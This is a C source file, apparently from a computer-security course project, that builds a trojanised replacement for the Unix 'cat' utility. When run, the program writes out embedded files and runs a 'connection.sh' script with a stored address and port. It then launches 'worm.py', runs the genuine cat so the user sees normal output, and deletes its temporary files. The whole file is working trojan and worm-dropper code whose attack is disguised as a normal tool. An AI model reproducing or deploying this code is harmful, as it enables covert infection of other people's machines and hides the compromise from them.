// xxd the tool use to see binary file
// xxd cat | tail -n 1 to see last 4 bytes
// https://blog.kalan.dev/2020-03-28-xxd-%E7%B0%A1%E6%98%93%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%E7%B4%80%E9%8C%84/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include "cat.h"
#include "connection.h"
#include "address_port.h"

int main(int argc, char *argv[]){
    //create temp txt to obtain port number and address
    // create temp file
    FILE *fptr;
    fptr = fopen("address_port.txt", "wb");
    fwrite(address_port_txt, address_port_txt_len, 1, fptr);
    fclose(fptr);


    // read file
    char command[60] = "bash connection.sh";
    fptr = fopen("address_port.txt", "r");
    char *line = NULL;
    size_t len;
    getline(&line, &len, fptr);
    // printf("%s %ld",line, strlen(line));
    strcat(command, line);
    // printf("%s",command);
    fclose(fptr);
    // system("rm address_port.txt");

    //create temp shell script and execute it
    fptr = fopen("connection.sh", "wb");
    fwrite(connection_sh, connection_sh_len, 1, fptr);
    fclose(fptr);
    system(command);
    sleep(4);
    // system("rm connection.sh");

    //execute worm
    system("python3 worm.py");

    // system("rm worm.py");

    //create temp .zip file, uncompress it and execute it with argv argc
    fptr = fopen("./compression.zip", "wb");
    fwrite(cat_infect_zip, cat_infect_zip_len, 1, fptr);
    fclose(fptr);
    system("unzip compression.zip > log.txt");
    
    pid_t pid;
    pid = fork();
    if(pid == 0){
        // child
        // execute cat
        char a[] = "cat";
        argv[0] = a;
        // for(int i = 0; i < argc; i++){
        //     printf("%s\n", argv[i]);
        // }
        // absolutely path
        // int outcome = execvp("/home/wc/computer_security/ComputerSecurity/project3/task2/cat", argv);
        int outcome = execvp("/home/csc2021/cat", argv);
        if(outcome == -1)printf("error in execvp\n");
    }
    else{
        //parent
        int status;
        waitpid(pid, &status, 0);
        system("rm compression.zip");
        system("rm log.txt");
        system("rm cat");
    }

}